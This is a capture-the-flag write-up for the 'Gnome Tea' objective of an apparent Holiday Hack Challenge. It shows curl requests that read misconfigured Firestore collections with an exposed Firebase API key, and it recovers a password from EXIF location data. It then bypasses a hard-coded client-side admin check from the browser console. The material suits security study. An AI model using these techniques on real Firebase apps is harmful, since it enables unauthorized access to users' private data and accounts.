---
layout: default
title: act3_gnome_tea_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act2_going_in_reverse_mjd.html">Previous Objective: Act2 Going in Reverse</a></th>
  <th><a href="/HHC_2025/index.html">Table of Contents</a></th>
  <th><a href="/HHC_2025/act3_hack-a-gnome_mjd.html">Next Objective: Act3 Hack-a-Gnome</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Gnome Tea</th>
<th>Difficulty Level: 3</th>
</tr>
</thead>
<tbody>
<tr>
<td>Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.</td>
<td>Location: Apartment Building</td>
</tr>
</tbody>
</table>

<h2>Solution Overview</h2>

Starting with only public access to the web application, reconnaisance was conducted to identify weaknesses. A comment was found in the page code that indicated some collections may allow insecure access. Probing those collections identified a clue to a user's password that would lead to the password. The username was identified in a collection. The password was decoded from  the latitude and longitude data contained in the image metadata. Once logged into the application as the user, code that determined if a user should have admin access was identified and abused, resulting in identifing the secret passphrase.

<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Developer information disclosure</td>
<td>Reconnaissance</td>
<td>T1593</td>
<td>Search Open Websites</td>
</tr>
<tr>
<td>Found commented code</td>
<td>Reconnaissance</td>
<td>T1595.002</td>
<td>Vulnerability Scanning</td>
</tr>
<tr>
<td>Gain access to web application: Leak Sensitive Information</td>
<td>Reconnaissance</td>
<td>T1589</td>
<td>Gather Victim Identity Information</td>
</tr>
<tr>
<td>Gain admin access to application</td>
<td>Privilege Escalation</td>
<td>T1548</td>
<td>Abuse elevation control mechanism</td>
</tr>
</tbody>
</table>

<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>

Using Edge's developer tools, the application code is reviewed. An interesting comment is found on the page:

<img src="/HHC_2025/images/gnometea_interestingcomment.jpg" alt="Interesting Comment">

The API key is part of the URL:

https://holidayhack2025.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&appName=%5BDEFAULT%5D&v=11.10.0&eid=p&usegapi=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.W5qDlPExdtA.O%2Fd%3D1%2Frs%3DAHpOoo8JInlRP_yLzwScb00AozrrUS6gJg%2Fm%3D__features__

apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Using Burp, the configuration is retreived:

const OP={apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayhack2025.firebaseapp.com",projectId:"holidayhack2025",storageBucket:"holidayhack2025.firebasestorage.app",messagingSenderId:"341227752777",appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"},

Following the comment in the page code, let's see what collections are accessible:

curl -X GET \
<br>
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains messages, gnome names, and sender UIDS

curl -X GET \
<br>
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains avatars, authids,

curl -X GET \
<br>
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk

Collection contains email addresses, notes and jpeg pictures

Looking in the dms collection contains a lot of messages. Searching for the string "password" reveals that Barnaby's image file contains location data that will identify his password.

curl -X GET \
<br>
  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"

<img src="/HHC_2025/images/gnometea_passwordhint.jpg" alt="Password Hint">

Searching the gnomes collection reveals Barnabies email address. This is needed for login.

<img src="/HHC_2025/images/gnometea_username.jpg" alt="Barnaby's Username">

<strong>Username: barnabybriefcase@gnomemail.dosis</strong>

The correct URL to obtain Barnaby's image is: https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg

curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o drivers_license.jpeg

<img src="/HHC_2025/images/gnometea_exifdata.jpg" alt="Image Exifdata">

The image was taken at: 33 deg 27' 53.85" S, 115 deg 54' 37.62" E

Converting the Latitude and Longitude into a format for Google Maps:

https://www.google.com/maps?q=-33.464958,115.910450

<img src="/HHC_2025/images/gnometea_password.jpg" alt="Barnaby's Password">

With valid credentials, login is achieved as Barnaby.

<img src="/HHC_2025/images/gnometea_login.jpg" alt="Gnome Tea Login">

Following the hint about client side controls, the source code now available is reviewed, and admin access is hard coded into the source.

<pre><code class="language-javascript">
    const [r,e] = K.useState({
        totalGnomes: 0,
        totalTea: 0,
        totalDMs: 0
    })
      , [t,s] = K.useState(!0)
      , [o,l] = K.useState(null)
      , [h,f] = K.useState(!1)
      , [m,v] = K.useState(!1)
      , {user: _} = _l()
      , T = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
    typeof window < "u" && (window.EXPECTED_ADMIN_UID = T),

</code></pre>

Using the console in Edge's developer tools, admin access is achieved by setting T to 3loaihgxP0VwCTKmkHHFLe6FZ4m2

<img src="/HHC_2025/images/gnometea_solution.jpg" alt="Gnome Tea Solution">

<strong>Answer: GigGigglesGiggler</strong>

</details>

<h2>Tools Reference</h2>

<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Suite Community Edition</td>
<td>2024.11.2</td>
</tr>
<tr>
<td>exiftool</td>
<td>N/A</td>
</tr>
<tr>
<td>Google Earth</td>
<td>N/A</td>
</tr>
<tr>
<td>Edge Developer Tools</td>
<td>Version 142.0.3595.94</td>
</tr>
</tbody>
</table>

<h2>Hints Reference</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>License: Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.</td>
</tr>
<tr>
<td>Santa</td>
<td>GnomeTea: I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services.</td>
</tr>
<tr>
<td>Santa</td>
<td>Statistically Coded: Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.</td>
</tr>
<tr>
<td>Santa</td>
<td>Rules: Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages.</td>
</tr>
<tr>
<td>CraHan</td>
<td>Say, you wouldn't happen to have time to help me out with something? The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away. I know they've been using GnomeTea to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is. I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.</td>
</tr>
</tbody>
</table>

<h2>Acknowledgements</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Eucrates</td>
<td>Introduced me to Claude.ai</td>
</tr>
</tbody>
</table>

